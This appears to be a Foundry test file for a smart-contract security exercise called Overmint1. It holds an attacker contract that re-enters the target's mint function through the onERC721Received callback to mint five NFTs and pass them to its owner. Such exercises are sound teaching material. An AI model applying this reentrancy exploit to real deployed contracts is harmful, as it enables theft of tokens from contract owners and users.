// SPDX-License-Identifier: MIT

import {Test, console} from "forge-std/Test.sol";
import {Overmint1} from "../src/Overmint1.sol";

pragma solidity ^0.8.0;

contract Overmint1Test is Test {
    Overmint1 overmintContract;

    address public victim = makeAddr("victim");
    address public attacker = makeAddr("attacker");

    function setUp() public {
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        overmintContract = new Overmint1();

        vm.deal(attacker, 3 ether);
    }

    function testOvermint1() public {
        uint256 currentNonce = vm.getNonce(attacker);

        vm.startPrank(attacker);
        Overmint1Attacker overmintContractAttacker = new Overmint1Attacker(overmintContract);
        overmintContractAttacker.attack();
        vm.stopPrank();

        assertEq(overmintContract.balanceOf(attacker), 5);
        assertEq(overmintContract.success(attacker), true);
        assert(vm.getNonce(attacker) < currentNonce + 3);
    }
}

contract Overmint1Attacker {
    Overmint1 public overmintContract;
    address public owner;

    uint256 enteredAmount;

    constructor(Overmint1 _overmintContract) {
        owner = msg.sender;
        overmintContract = _overmintContract;
    }

    function attack() public {
        overmintContract.mint();

        for (uint256 i = 1; i < 6; i++) {
            overmintContract.transferFrom(address(this), owner, i);
        }
    }

    function onERC721Received(address, address, uint256, bytes memory) public returns (bytes4) {
        if (enteredAmount < 5) {
            enteredAmount++;
            overmintContract.mint();
        }
        return this.onERC721Received.selector;
    }
}
